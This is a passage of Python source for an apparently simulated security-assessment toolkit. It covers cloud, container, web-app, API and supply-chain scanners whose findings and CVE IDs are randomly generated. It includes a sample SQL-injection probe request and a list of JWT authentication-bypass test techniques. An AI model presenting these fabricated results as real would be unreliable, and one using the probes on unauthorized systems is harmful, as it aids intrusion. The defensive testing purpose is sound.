            "‚îÄ" * 40
        ])
        
        for domain in sample['iocs_extracted']['domains']:
            lines.append(f"   DNS: {domain}")
        for ip in sample['iocs_extracted']['ips']:
            lines.append(f"   IP: {ip}")
        
        lines.extend([
            "",
            "üõ°Ô∏è MITRE ATT&CK MAPPING",
            "‚îÄ" * 40
        ])
        
        for technique in sample['mitre_techniques']:
            lines.append(f"   ‚Ä¢ {technique}")
        
        lines.extend([
            "",
            "=" * 70
        ])
        
        return "\n".join(lines)


class CloudSecurityAssessor:
    """Cloud security posture assessment."""
    
    def __init__(self):
        self.cloud_providers = {
            'aws': {
                'services': ['EC2', 'S3', 'IAM', 'Lambda', 'RDS', 'VPC', 'CloudTrail', 'KMS'],
                'common_misconfigs': [
                    'Public S3 buckets',
                    'Overly permissive IAM policies',
                    'Unencrypted EBS volumes',
                    'Security groups with 0.0.0.0/0',
                    'Disabled CloudTrail logging',
                    'Root account without MFA',
                    'Hardcoded credentials in Lambda',
                    'Public RDS instances'
                ]
            },
            'azure': {
                'services': ['VMs', 'Blob Storage', 'Azure AD', 'Functions', 'SQL', 'VNet', 'KeyVault'],
                'common_misconfigs': [
                    'Anonymous blob access',
                    'Excessive Azure AD permissions',
                    'Unencrypted storage accounts',
                    'NSG with any/any rules',
                    'Disabled activity logs',
                    'Weak conditional access',
                    'Exposed App registrations'
                ]
            },
            'gcp': {
                'services': ['Compute', 'Cloud Storage', 'IAM', 'Cloud Functions', 'BigQuery', 'VPC'],
                'common_misconfigs': [
                    'Public Cloud Storage buckets',
                    'Primitive IAM roles',
                    'Service account key sprawl',
                    'Firewall rules too permissive',
                    'Audit logging disabled',
                    'Default service accounts used'
                ]
            }
        }
        
        self.assessments: Dict[str, Dict[str, Any]] = {}
        
    def create_assessment(self, provider: str, account_id: str,
                         assessment_name: str) -> str:
        """Create a new cloud security assessment."""
        assess_id = f"CLOUD-{len(self.assessments)+1:04d}"
        
        provider_info = self.cloud_providers.get(provider, {})
        
        self.assessments[assess_id] = {
            'id': assess_id,
            'name': assessment_name,
            'provider': provider,
            'account_id': account_id,
            'created_at': datetime.now().isoformat(),
            'status': 'in_progress',
            'findings': [],
            'services_scanned': [],
            'resources_analyzed': 0,
            'compliance_frameworks': ['CIS Benchmarks', 'NIST 800-53']
        }
        
        return assess_id
    
    def simulate_scan(self, assess_id: str) -> Dict[str, Any]:
        """Simulate cloud security scan."""
        if assess_id not in self.assessments:
            return {'error': 'Assessment not found'}
            
        assessment = self.assessments[assess_id]
        provider = assessment['provider']
        provider_info = self.cloud_providers.get(provider, {})
        
        # Simulate scanning results
        findings = []
        services_scanned = random.sample(provider_info.get('services', []), 
                                        min(6, len(provider_info.get('services', []))))
        
        misconfigs = provider_info.get('common_misconfigs', [])
        num_findings = random.randint(5, 15)
        
        for i in range(num_findings):
            severity = random.choice(['critical', 'high', 'medium', 'low'])
            finding = {
                'id': f"FINDING-{i+1:04d}",
                'title': random.choice(misconfigs),
                'severity': severity,
                'service': random.choice(services_scanned),
                'affected_resources': random.randint(1, 10),
                'remediation_available': random.random() > 0.3,
                'compliance_violation': random.sample(['CIS', 'NIST', 'SOC2'], random.randint(1, 2))
            }
            findings.append(finding)
        
        assessment['findings'] = findings
        assessment['services_scanned'] = services_scanned
        assessment['resources_analyzed'] = random.randint(100, 1000)
        assessment['status'] = 'completed'
        
        # Calculate risk score
        severity_weights = {'critical': 10, 'high': 5, 'medium': 2, 'low': 1}
        total_weight = sum(severity_weights.get(f['severity'], 1) for f in findings)
        risk_score = min(100, total_weight * 2)
        
        return {
            'assessment_id': assess_id,
            'status': 'completed',
            'services_scanned': len(services_scanned),
            'resources_analyzed': assessment['resources_analyzed'],
            'total_findings': len(findings),
            'findings_by_severity': {
                'critical': sum(1 for f in findings if f['severity'] == 'critical'),
                'high': sum(1 for f in findings if f['severity'] == 'high'),
                'medium': sum(1 for f in findings if f['severity'] == 'medium'),
                'low': sum(1 for f in findings if f['severity'] == 'low')
            },
            'risk_score': risk_score,
            'risk_level': 'Critical' if risk_score >= 75 else 'High' if risk_score >= 50 else 'Medium' if risk_score >= 25 else 'Low'
        }
    
    def get_remediation_scripts(self, assess_id: str, 
                               finding_id: str) -> Dict[str, str]:
        """Get remediation scripts for a finding."""
        assessment = self.assessments.get(assess_id)
        if not assessment:
            return {}
            
        provider = assessment['provider']
        
        remediation_templates = {
            'aws': {
                'Public S3 buckets': '''
# Block public access on S3 bucket
aws s3api put-public-access-block \\
    --bucket {bucket_name} \\
    --public-access-block-configuration \\
    "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"
''',
                'Security groups with 0.0.0.0/0': '''
# Remove 0.0.0.0/0 ingress rule
aws ec2 revoke-security-group-ingress \\
    --group-id {sg_id} \\
    --protocol tcp \\
    --port {port} \\
    --cidr 0.0.0.0/0
'''
            },
            'azure': {
                'Anonymous blob access': '''
# Disable anonymous access on storage account
az storage account update \\
    --name {storage_account} \\
    --allow-blob-public-access false
'''
            },
            'gcp': {
                'Public Cloud Storage buckets': '''
# Remove allUsers access
gsutil iam ch -d allUsers:objectViewer gs://{bucket_name}
'''
            }
        }
        
        finding = next((f for f in assessment.get('findings', []) 
                       if f['id'] == finding_id), None)
        
        if finding:
            title = finding['title']
            return {
                'script': remediation_templates.get(provider, {}).get(title, 
                    f"# Manual remediation required for: {title}"),
                'provider': provider,
                'finding': title
            }
        
        return {}


class ContainerSecurityScanner:
    """Container and Kubernetes security assessment."""
    
    def __init__(self):
        self.container_risks: Dict[str, Dict[str, Any]] = {
            'privileged_container': {
                'severity': 'critical',
                'description': 'Container running with privileged flag',
                'impact': 'Full host access',
                'remediation': 'Remove privileged: true from container spec'
            },
            'host_network': {
                'severity': 'high',
                'description': 'Container using host network namespace',
                'impact': 'Network isolation bypass',
                'remediation': 'Use pod network unless specifically required'
            },
            'host_pid': {
                'severity': 'high',
                'description': 'Container using host PID namespace',
                'impact': 'Process visibility and manipulation',
                'remediation': 'Remove hostPID: true'
            },
            'no_resource_limits': {
                'severity': 'medium',
                'description': 'Container without resource limits',
                'impact': 'Resource exhaustion DoS',
                'remediation': 'Set CPU and memory limits'
            },
            'root_user': {
                'severity': 'high',
                'description': 'Container running as root',
                'impact': 'Elevated privileges in container',
                'remediation': 'Set runAsNonRoot: true and specify runAsUser'
            },
            'writable_rootfs': {
                'severity': 'medium',
                'description': 'Root filesystem is writable',
                'impact': 'Persistent modifications possible',
                'remediation': 'Set readOnlyRootFilesystem: true'
            },
            'capability_escalation': {
                'severity': 'high',
                'description': 'Dangerous capabilities granted',
                'impact': 'Container escape potential',
                'remediation': 'Drop all capabilities, add only needed'
            },
            'sensitive_mount': {
                'severity': 'critical',
                'description': 'Sensitive host path mounted',
                'impact': 'Host filesystem access',
                'remediation': 'Remove sensitive volume mounts'
            },
            'default_service_account': {
                'severity': 'medium',
                'description': 'Using default service account',
                'impact': 'Unintended API access',
                'remediation': 'Create dedicated service account with minimal permissions'
            },
            'missing_network_policy': {
                'severity': 'medium',
                'description': 'No network policy defined',
                'impact': 'Unrestricted pod communication',
                'remediation': 'Implement network policies for traffic control'
            }
        }
        
        self.k8s_components: Dict[str, List[str]] = {
            'control_plane': ['kube-apiserver', 'etcd', 'kube-controller-manager', 'kube-scheduler'],
            'node': ['kubelet', 'kube-proxy', 'container-runtime'],
            'addons': ['coredns', 'ingress-controller', 'metrics-server']
        }
        
        self.image_vulns: Dict[str, Dict[str, Any]] = {}
        self.scanned_containers: List[Dict[str, Any]] = []
        
    def scan_container_image(self, image_name: str, 
                            image_tag: str = 'latest') -> Dict[str, Any]:
        """Scan a container image for vulnerabilities."""
        scan_id = f"IMGSCAN-{len(self.image_vulns)+1:04d}"
        
        # Simulate vulnerability scan results
        vulns = {
            'critical': random.randint(0, 3),
            'high': random.randint(0, 8),
            'medium': random.randint(2, 15),
            'low': random.randint(5, 30)
        }
        
        # Simulate discovered vulnerabilities
        discovered_vulns = []
        for i in range(vulns['critical'] + vulns['high']):
            discovered_vulns.append({
                'cve_id': f"CVE-202{random.randint(0,4)}-{random.randint(10000,99999)}",
                'package': random.choice(['openssl', 'glibc', 'curl', 'libxml2', 'zlib', 'busybox']),
                'severity': 'critical' if i < vulns['critical'] else 'high',
                'fixed_version': f"{random.randint(1,5)}.{random.randint(0,9)}.{random.randint(1,20)}",
                'installed_version': f"{random.randint(1,3)}.{random.randint(0,9)}.{random.randint(1,10)}"
            })
        
        result = {
            'scan_id': scan_id,
            'image': f"{image_name}:{image_tag}",
            'scanned_at': datetime.now().isoformat(),
            'os': random.choice(['alpine:3.18', 'debian:bullseye', 'ubuntu:22.04']),
            'layer_count': random.randint(5, 20),
            'image_size_mb': random.randint(50, 500),
            'vulnerability_counts': vulns,
            'total_vulnerabilities': sum(vulns.values()),
            'top_vulnerabilities': discovered_vulns[:10],
            'secrets_detected': random.randint(0, 2),
            'malware_detected': False,
            'compliance': {
                'cis_docker_benchmark': random.randint(60, 95),
                'passed_checks': random.randint(15, 25),
                'failed_checks': random.randint(2, 10)
            }
        }
        
        self.image_vulns[scan_id] = result
        return result
    
    def scan_k8s_cluster(self, cluster_name: str) -> Dict[str, Any]:
        """Perform Kubernetes cluster security assessment."""
        findings = []
        
        # Simulate scanning various K8s security aspects
        security_checks = [
            ('RBAC', 'rbac_analysis', random.randint(2, 8)),
            ('Pod Security', 'pod_security', random.randint(5, 15)),
            ('Network Policies', 'network_policies', random.randint(1, 5)),
            ('Secrets Management', 'secrets', random.randint(2, 6)),
            ('API Server', 'api_server', random.randint(1, 4)),
            ('etcd Security', 'etcd', random.randint(0, 3)),
            ('Node Security', 'node_security', random.randint(3, 10))
        ]
        
        for check_name, check_type, finding_count in security_checks:
            for i in range(finding_count):
                risk_key = random.choice(list(self.container_risks.keys()))
                risk = self.container_risks[risk_key]
                
                findings.append({
                    'id': f"K8S-{len(findings)+1:04d}",
                    'category': check_name,
                    'type': check_type,
                    'title': risk_key.replace('_', ' ').title(),
                    'severity': risk['severity'],
                    'description': risk['description'],
                    'remediation': risk['remediation'],
                    'affected_resources': random.randint(1, 10)
                })
        
        # Calculate compliance score
        severity_weights = {'critical': 15, 'high': 10, 'medium': 5, 'low': 2}
        total_weight = sum(severity_weights.get(f['severity'], 2) for f in findings)
        compliance_score = max(0, 100 - (total_weight / 2))
        
        return {
            'cluster_name': cluster_name,
            'scanned_at': datetime.now().isoformat(),
            'kubernetes_version': f"1.{random.randint(25,29)}.{random.randint(0,5)}",
            'node_count': random.randint(3, 20),
            'namespace_count': random.randint(5, 30),
            'pod_count': random.randint(50, 500),
            'findings': findings,
            'findings_by_severity': {
                'critical': sum(1 for f in findings if f['severity'] == 'critical'),
                'high': sum(1 for f in findings if f['severity'] == 'high'),
                'medium': sum(1 for f in findings if f['severity'] == 'medium'),
                'low': sum(1 for f in findings if f['severity'] == 'low')
            },
            'compliance_score': compliance_score,
            'cis_benchmark_compliance': compliance_score * 0.95,
            'recommendations': [
                'Enable Pod Security Admission',
                'Implement network policies',
                'Use dedicated service accounts',
                'Enable audit logging',
                'Restrict API server access'
            ]
        }
    
    def generate_security_report(self, scan_results: Dict[str, Any]) -> str:
        """Generate container security report."""
        lines = [
            "=" * 70,
            "üê≥ CONTAINER SECURITY ASSESSMENT REPORT",
            "=" * 70,
            "",
            f"Cluster: {scan_results.get('cluster_name', 'N/A')}",
            f"Scan Date: {scan_results.get('scanned_at', 'N/A')}",
            f"Kubernetes Version: {scan_results.get('kubernetes_version', 'N/A')}",
            "",
            "üìä CLUSTER OVERVIEW",
            "‚îÄ" * 40,
            f"   Nodes: {scan_results.get('node_count', 0)}",
            f"   Namespaces: {scan_results.get('namespace_count', 0)}",
            f"   Pods: {scan_results.get('pod_count', 0)}",
            "",
            f"üîí COMPLIANCE SCORE: {scan_results.get('compliance_score', 0):.1f}/100",
            "",
            "‚ö†Ô∏è FINDINGS SUMMARY",
            "‚îÄ" * 40
        ]
        
        sev_icons = {'critical': 'üî¥', 'high': 'üü†', 'medium': 'üü°', 'low': 'üü¢'}
        for sev, count in scan_results.get('findings_by_severity', {}).items():
            lines.append(f"   {sev_icons.get(sev, '‚ö™')} {sev.upper()}: {count}")
        
        lines.extend([
            "",
            "üìã TOP RECOMMENDATIONS",
            "‚îÄ" * 40
        ])
        
        for rec in scan_results.get('recommendations', [])[:5]:
            lines.append(f"   ‚Ä¢ {rec}")
        
        lines.extend([
            "",
            "=" * 70
        ])
        
        return "\n".join(lines)


class WebAppSecurityScanner:
    """Web application security scanning and assessment."""
    
    def __init__(self):
        self.vulnerability_types: Dict[str, Dict[str, Any]] = {
            'sql_injection': {
                'name': 'SQL Injection',
                'owasp': 'A03:2021',
                'cwe': 'CWE-89',
                'severity': 'critical',
                'impact': 'Data breach, authentication bypass, RCE'
            },
            'xss_reflected': {
                'name': 'Reflected XSS',
                'owasp': 'A03:2021',
                'cwe': 'CWE-79',
                'severity': 'high',
                'impact': 'Session hijacking, defacement'
            },
            'xss_stored': {
                'name': 'Stored XSS',
                'owasp': 'A03:2021',
                'cwe': 'CWE-79',
                'severity': 'high',
                'impact': 'Persistent attacks, worm propagation'
            },
            'xss_dom': {
                'name': 'DOM-based XSS',
                'owasp': 'A03:2021',
                'cwe': 'CWE-79',
                'severity': 'medium',
                'impact': 'Client-side attacks'
            },
            'csrf': {
                'name': 'Cross-Site Request Forgery',
                'owasp': 'A01:2021',
                'cwe': 'CWE-352',
                'severity': 'medium',
                'impact': 'Unauthorized actions'
            },
            'ssrf': {
                'name': 'Server-Side Request Forgery',
                'owasp': 'A10:2021',
                'cwe': 'CWE-918',
                'severity': 'high',
                'impact': 'Internal network access, cloud metadata'
            },
            'xxe': {
                'name': 'XML External Entity',
                'owasp': 'A05:2021',
                'cwe': 'CWE-611',
                'severity': 'high',
                'impact': 'File disclosure, SSRF, DoS'
            },
            'path_traversal': {
                'name': 'Path Traversal',
                'owasp': 'A01:2021',
                'cwe': 'CWE-22',
                'severity': 'high',
                'impact': 'File disclosure, code execution'
            },
            'command_injection': {
                'name': 'Command Injection',
                'owasp': 'A03:2021',
                'cwe': 'CWE-78',
                'severity': 'critical',
                'impact': 'Remote code execution'
            },
            'idor': {
                'name': 'Insecure Direct Object Reference',
                'owasp': 'A01:2021',
                'cwe': 'CWE-639',
                'severity': 'high',
                'impact': 'Unauthorized data access'
            },
            'broken_auth': {
                'name': 'Broken Authentication',
                'owasp': 'A07:2021',
                'cwe': 'CWE-287',
                'severity': 'critical',
                'impact': 'Account takeover'
            },
            'security_misconfig': {
                'name': 'Security Misconfiguration',
                'owasp': 'A05:2021',
                'cwe': 'CWE-16',
                'severity': 'medium',
                'impact': 'Information disclosure'
            },
            'ssti': {
                'name': 'Server-Side Template Injection',
                'owasp': 'A03:2021',
                'cwe': 'CWE-94',
                'severity': 'critical',
                'impact': 'Remote code execution'
            },
            'deserialization': {
                'name': 'Insecure Deserialization',
                'owasp': 'A08:2021',
                'cwe': 'CWE-502',
                'severity': 'critical',
                'impact': 'Remote code execution'
            }
        }
        
        self.scans: Dict[str, Dict[str, Any]] = {}
        
    def create_scan(self, target_url: str, scan_type: str = 'full') -> str:
        """Create a new web application scan."""
        scan_id = f"WEBSCAN-{len(self.scans)+1:04d}"
        
        self.scans[scan_id] = {
            'id': scan_id,
            'target_url': target_url,
            'scan_type': scan_type,  # full, quick, api, authenticated
            'created_at': datetime.now().isoformat(),
            'status': 'pending',
            'progress': 0,
            'findings': [],
            'endpoints_discovered': 0,
            'parameters_tested': 0,
            'authentication': None
        }
        
        return scan_id
    
    def run_scan(self, scan_id: str) -> Dict[str, Any]:
        """Execute web application scan."""
        if scan_id not in self.scans:
            return {'error': 'Scan not found'}
            
        scan = self.scans[scan_id]
        scan['status'] = 'completed'
        scan['progress'] = 100
        scan['completed_at'] = datetime.now().isoformat()
        
        # Simulate scan results
        scan['endpoints_discovered'] = random.randint(20, 200)
        scan['parameters_tested'] = random.randint(50, 500)
        
        # Generate findings
        num_findings = random.randint(5, 25)
        findings = []
        
        for i in range(num_findings):
            vuln_type = random.choice(list(self.vulnerability_types.keys()))
            vuln_info = self.vulnerability_types[vuln_type]
            
            finding = {
                'id': f"VULN-{i+1:04d}",
                'type': vuln_type,
                'name': vuln_info['name'],
                'severity': vuln_info['severity'],
                'owasp': vuln_info['owasp'],
                'cwe': vuln_info['cwe'],
                'url': f"{scan['target_url']}/endpoint{random.randint(1,50)}",
                'parameter': random.choice(['id', 'name', 'search', 'page', 'user', 'file', 'data']),
                'method': random.choice(['GET', 'POST']),
                'evidence': f"Response indicates {vuln_info['name']} vulnerability",
                'impact': vuln_info['impact'],
                'remediation': f"Implement proper input validation for {vuln_type}",
                'confidence': random.choice(['certain', 'firm', 'tentative'])
            }
            findings.append(finding)
        
        scan['findings'] = findings
        
        # Calculate summary statistics
        summary = {
            'scan_id': scan_id,
            'target': scan['target_url'],
            'status': 'completed',
            'duration_seconds': random.randint(60, 1800),
            'endpoints_discovered': scan['endpoints_discovered'],
            'parameters_tested': scan['parameters_tested'],
            'total_findings': len(findings),
            'findings_by_severity': {
                'critical': sum(1 for f in findings if f['severity'] == 'critical'),
                'high': sum(1 for f in findings if f['severity'] == 'high'),
                'medium': sum(1 for f in findings if f['severity'] == 'medium'),
                'low': sum(1 for f in findings if f['severity'] == 'low')
            },
            'owasp_coverage': list(set(f['owasp'] for f in findings)),
            'risk_score': min(100, sum(10 if f['severity'] == 'critical' else 
                                       5 if f['severity'] == 'high' else
                                       2 if f['severity'] == 'medium' else 1 
                                       for f in findings))
        }
        
        return summary
    
    def get_finding_details(self, scan_id: str, 
                           finding_id: str) -> Dict[str, Any]:
        """Get detailed information about a finding."""
        scan = self.scans.get(scan_id)
        if not scan:
            return {'error': 'Scan not found'}
            
        finding = next((f for f in scan['findings'] if f['id'] == finding_id), None)
        if not finding:
            return {'error': 'Finding not found'}
            
        # Add detailed information
        detailed = dict(finding)
        detailed['request'] = f"""
GET {finding['url']}?{finding['parameter']}=test'--
Host: example.com
User-Agent: SecurityScanner/1.0
"""
        detailed['response_snippet'] = f"""
HTTP/1.1 500 Internal Server Error
Content-Type: text/html

<html>
<body>
Error: SQL syntax error near "test'--"
</body>
</html>
"""
        detailed['reproduction_steps'] = [
            f"1. Navigate to {finding['url']}",
            f"2. Inject payload in '{finding['parameter']}' parameter",
            "3. Observe error response indicating vulnerability"
        ]
        detailed['references'] = [
            f"https://owasp.org/Top10/{finding['owasp']}",
            f"https://cwe.mitre.org/data/definitions/{finding['cwe'].split('-')[1]}.html"
        ]
        
        return detailed
    
    def generate_scan_report(self, scan_id: str) -> str:
        """Generate web application security report."""
        scan = self.scans.get(scan_id)
        if not scan:
            return "Scan not found"
            
        lines = [
            "=" * 70,
            "üåê WEB APPLICATION SECURITY SCAN REPORT",
            "=" * 70,
            "",
            f"Target: {scan['target_url']}",
            f"Scan ID: {scan_id}",
            f"Scan Type: {scan['scan_type'].upper()}",
            f"Completed: {scan.get('completed_at', 'N/A')}",
            "",
            "üìä SCAN STATISTICS",
            "‚îÄ" * 40,
            f"   Endpoints Discovered: {scan['endpoints_discovered']}",
            f"   Parameters Tested: {scan['parameters_tested']}",
            f"   Total Findings: {len(scan['findings'])}",
            "",
            "‚ö†Ô∏è VULNERABILITY SUMMARY",
            "‚îÄ" * 40
        ]
        
        sev_icons = {'critical': 'üî¥', 'high': 'üü†', 'medium': 'üü°', 'low': 'üü¢'}
        severity_counts = {}
        for finding in scan['findings']:
            sev = finding['severity']
            severity_counts[sev] = severity_counts.get(sev, 0) + 1
        
        for sev in ['critical', 'high', 'medium', 'low']:
            count = severity_counts.get(sev, 0)
            lines.append(f"   {sev_icons.get(sev, '‚ö™')} {sev.upper()}: {count}")
        
        # Top vulnerabilities
        lines.extend([
            "",
            "üîç TOP FINDINGS",
            "‚îÄ" * 40
        ])
        
        critical_high = [f for f in scan['findings'] 
                        if f['severity'] in ['critical', 'high']][:5]
        
        for finding in critical_high:
            lines.append(f"   [{finding['severity'].upper()}] {finding['name']}")
            lines.append(f"      URL: {finding['url']}")
            lines.append(f"      Parameter: {finding['parameter']}")
            lines.append("")
        
        # OWASP Coverage
        owasp_found = set(f['owasp'] for f in scan['findings'])
        lines.extend([
            "üìã OWASP TOP 10 COVERAGE",
            "‚îÄ" * 40,
            f"   Categories Affected: {len(owasp_found)}/10",
            f"   Categories: {', '.join(sorted(owasp_found))}",
            "",
            "=" * 70
        ])
        
        return "\n".join(lines)


class APISecurityTester:
    """API security testing and assessment."""
    
    def __init__(self):
        self.api_vulnerabilities: Dict[str, Dict[str, Any]] = {
            'broken_object_auth': {
                'owasp_api': 'API1:2023',
                'name': 'Broken Object Level Authorization',
                'severity': 'critical',
                'tests': ['IDOR', 'UUID enumeration', 'horizontal privilege escalation']
            },
            'broken_auth': {
                'owasp_api': 'API2:2023',
                'name': 'Broken Authentication',
                'severity': 'critical',
                'tests': ['Weak passwords', 'Token leakage', 'Credential stuffing']
            },
            'broken_object_prop': {
                'owasp_api': 'API3:2023',
                'name': 'Broken Object Property Level Authorization',
                'severity': 'high',
                'tests': ['Mass assignment', 'Excessive data exposure']
            },
            'unrestricted_resource': {
                'owasp_api': 'API4:2023',
                'name': 'Unrestricted Resource Consumption',
                'severity': 'medium',
                'tests': ['Rate limiting', 'Pagination', 'Resource exhaustion']
            },
            'broken_function_auth': {
                'owasp_api': 'API5:2023',
                'name': 'Broken Function Level Authorization',
                'severity': 'critical',
                'tests': ['Admin endpoint access', 'Vertical privilege escalation']
            },
            'unrestricted_sensitive': {
                'owasp_api': 'API6:2023',
                'name': 'Unrestricted Access to Sensitive Business Flows',
                'severity': 'high',
                'tests': ['Business logic bypass', 'Abuse of functionality']
            },
            'ssrf': {
                'owasp_api': 'API7:2023',
                'name': 'Server Side Request Forgery',
                'severity': 'high',
                'tests': ['Internal network access', 'Cloud metadata access']
            },
            'security_misconfig': {
                'owasp_api': 'API8:2023',
                'name': 'Security Misconfiguration',
                'severity': 'medium',
                'tests': ['CORS', 'Error messages', 'Unnecessary features']
            },
            'improper_inventory': {
                'owasp_api': 'API9:2023',
                'name': 'Improper Inventory Management',
                'severity': 'medium',
                'tests': ['Shadow APIs', 'Deprecated endpoints', 'Documentation gaps']
            },
            'unsafe_consumption': {
                'owasp_api': 'API10:2023',
                'name': 'Unsafe Consumption of APIs',
                'severity': 'high',
                'tests': ['Third-party API trust', 'Response validation']
            }
        }
        
        self.api_specs: Dict[str, Dict[str, Any]] = {}
        self.test_results: Dict[str, Dict[str, Any]] = {}
        
    def import_api_spec(self, spec_type: str, spec_content: str) -> str:
        """Import API specification (OpenAPI, Swagger, etc.)."""
        spec_id = f"SPEC-{len(self.api_specs)+1:04d}"
        
        # Simulate parsing API specification
        endpoints = random.randint(10, 50)
        
        self.api_specs[spec_id] = {
            'id': spec_id,
            'type': spec_type,  # openapi3, swagger2, postman, graphql
            'imported_at': datetime.now().isoformat(),
            'endpoints': endpoints,
            'methods': {
                'GET': random.randint(5, endpoints // 2),
                'POST': random.randint(3, endpoints // 3),
                'PUT': random.randint(1, endpoints // 4),
                'DELETE': random.randint(1, endpoints // 5),
                'PATCH': random.randint(0, endpoints // 6)
            },
            'auth_schemes': random.sample(['bearer', 'api_key', 'basic', 'oauth2'], 
                                         random.randint(1, 3)),
            'content_types': ['application/json']
        }
        
        return spec_id
    
    def run_api_test(self, spec_id: str, test_types: List[str] = None) -> Dict[str, Any]:
        """Run API security tests."""
        if spec_id not in self.api_specs:
            return {'error': 'API specification not found'}
            
        spec = self.api_specs[spec_id]
        test_id = f"APITEST-{len(self.test_results)+1:04d}"
        
        if not test_types:
            test_types = list(self.api_vulnerabilities.keys())
        
        findings = []
        
        for vuln_type in test_types:
            vuln_info = self.api_vulnerabilities.get(vuln_type, {})
            
            # Simulate finding vulnerabilities
            if random.random() > 0.5:  # 50% chance to find each vuln type
                for test in vuln_info.get('tests', [])[:random.randint(1, 2)]:
                    findings.append({
                        'id': f"APIVULN-{len(findings)+1:04d}",
                        'type': vuln_type,
                        'name': vuln_info['name'],
                        'owasp_api': vuln_info['owasp_api'],
                        'severity': vuln_info['severity'],
                        'test': test,
                        'endpoint': f"/api/v1/resource{random.randint(1, spec['endpoints'])}",
                        'method': random.choice(['GET', 'POST', 'PUT']),
                        'description': f"{test} vulnerability detected",
                        'evidence': f"Response indicates {test.lower()} issue",
                        'remediation': f"Implement proper controls for {vuln_info['name']}"
                    })
        
        result = {
            'test_id': test_id,
            'spec_id': spec_id,
            'completed_at': datetime.now().isoformat(),
            'endpoints_tested': spec['endpoints'],
            'tests_performed': len(test_types),
            'findings': findings,
            'findings_by_severity': {
                'critical': sum(1 for f in findings if f['severity'] == 'critical'),
                'high': sum(1 for f in findings if f['severity'] == 'high'),
                'medium': sum(1 for f in findings if f['severity'] == 'medium'),
                'low': sum(1 for f in findings if f['severity'] == 'low')
            },
            'owasp_api_coverage': list(set(f['owasp_api'] for f in findings)),
            'compliance_score': max(0, 100 - len(findings) * 5)
        }
        
        self.test_results[test_id] = result
        return result
    
    def generate_auth_bypass_tests(self, spec_id: str) -> List[Dict[str, Any]]:
        """Generate authentication bypass test cases."""
        if spec_id not in self.api_specs:
            return []
            
        spec = self.api_specs[spec_id]
        tests = []
        
        bypass_techniques = [
            {
                'name': 'Remove Auth Header',
                'description': 'Send request without authentication header',
                'test': 'Remove Authorization/X-API-Key header entirely'
            },
            {
                'name': 'Empty Auth Token',
                'description': 'Send empty authentication value',
                'test': 'Set Authorization: Bearer '
            },
            {
                'name': 'Invalid Token Format',
                'description': 'Send malformed token',
                'test': 'Set Authorization: Bearer invalidtoken123'
            },
            {
                'name': 'Expired Token',
                'description': 'Send expired JWT/token',
                'test': 'Use token with expired exp claim'
            },
            {
                'name': 'Algorithm None Attack',
                'description': 'JWT algorithm confusion',
                'test': 'Set alg: none in JWT header'
            },
            {
                'name': 'Key Confusion',
                'description': 'RS256 to HS256 confusion',
                'test': 'Change algorithm and sign with public key'
            },
            {
                'name': 'Token Reuse',
                'description': 'Replay old/revoked tokens',
                'test': 'Use previously invalidated token'
            },
            {
                'name': 'Privilege Escalation',
                'description': 'Modify token claims',
                'test': 'Change role/admin claims in JWT'
            }
        ]
        
        for technique in bypass_techniques:
            for auth_scheme in spec['auth_schemes']:
                tests.append({
                    'technique': technique['name'],
                    'auth_scheme': auth_scheme,
                    'description': technique['description'],
                    'test_procedure': technique['test'],
                    'expected_result': 'Request should be rejected with 401/403',
                    'risk_if_passed': 'Authentication bypass possible'
                })
        
        return tests


class SupplyChainSecurityAnalyzer:
    """Software supply chain security analysis."""
    
    def __init__(self):
        self.dependency_risks: Dict[str, Dict[str, Any]] = {
            'known_vulnerability': {
                'severity': 'varies',
                'description': 'Dependency has known CVE',
                'action': 'Update to patched version'
            },
            'abandoned': {
                'severity': 'medium',
                'description': 'No updates in >2 years',
                'action': 'Consider alternatives'
            },
            'typosquatting': {
                'severity': 'critical',
                'description': 'Similar name to popular package',
                'action': 'Verify package authenticity'
            },
            'maintainer_compromise': {
                'severity': 'critical',
                'description': 'Maintainer account compromised',
                'action': 'Pin to known-good version'
            },
            'malicious_code': {
                'severity': 'critical',
                'description': 'Package contains malware',
                'action': 'Remove immediately'
            },
            'license_risk': {
                'severity': 'low',
                'description': 'Incompatible or risky license',
                'action': 'Legal review required'
            },
            'deprecated': {
                'severity': 'low',
                'description': 'Package officially deprecated',
                'action': 'Plan migration'
            }
        }
        
        self.package_registries = {
            'npm': {'ecosystem': 'JavaScript', 'packages': 2000000},
            'pypi': {'ecosystem': 'Python', 'packages': 500000},
            'maven': {'ecosystem': 'Java', 'packages': 500000},
            'nuget': {'ecosystem': '.NET', 'packages': 350000},
            'rubygems': {'ecosystem': 'Ruby', 'packages': 175000},
            'cargo': {'ecosystem': 'Rust', 'packages': 120000},
            'go': {'ecosystem': 'Go', 'packages': 100000}
        }
        
        self.analysis_results: Dict[str, Dict[str, Any]] = {}
        
    def analyze_dependencies(self, manifest_type: str, 
                           dependencies: List[Dict[str, str]]) -> Dict[str, Any]:
        """Analyze project dependencies for security risks."""
        analysis_id = f"SUPPLY-{len(self.analysis_results)+1:04d}"
        
        findings = []
        
        for dep in dependencies:
            # Simulate vulnerability check
            has_vuln = random.random() > 0.7
            
            if has_vuln:
                vuln_count = random.randint(1, 5)
                max_severity = random.choice(['critical', 'high', 'medium', 'low'])
                
                findings.append({
                    'package': dep.get('name', 'unknown'),
                    'version': dep.get('version', 'latest'),
                    'vulnerability_count': vuln_count,
                    'max_severity': max_severity,
                    'vulnerabilities': [
                        {
                            'cve': f"CVE-202{random.randint(0,4)}-{random.randint(10000,99999)}",
                            'severity': random.choice(['critical', 'high', 'medium', 'low']),
                            'fixed_in': f"{random.randint(1,5)}.{random.randint(0,9)}.{random.randint(1,20)}"
                        }
                        for _ in range(vuln_count)
                    ]
                })
            
            # Check for other risks
            if random.random() > 0.9:
                risk_type = random.choice(['abandoned', 'deprecated', 'license_risk'])
                findings.append({
                    'package': dep.get('name', 'unknown'),
                    'version': dep.get('version', 'latest'),
                    'risk_type': risk_type,
                    'risk_info': self.dependency_risks[risk_type]
                })
        
        # Calculate risk score
        severity_weights = {'critical': 20, 'high': 10, 'medium': 5, 'low': 2}
        risk_score = 0
        for finding in findings:
            if 'max_severity' in finding:
                risk_score += severity_weights.get(finding['max_severity'], 5)
            elif 'risk_info' in finding:
                risk_score += severity_weights.get(finding['risk_info']['severity'], 2)
        
        result = {
            'analysis_id': analysis_id,
            'manifest_type': manifest_type,
            'analyzed_at': datetime.now().isoformat(),
            'total_dependencies': len(dependencies),
            'direct_dependencies': len([d for d in dependencies if d.get('direct', True)]),
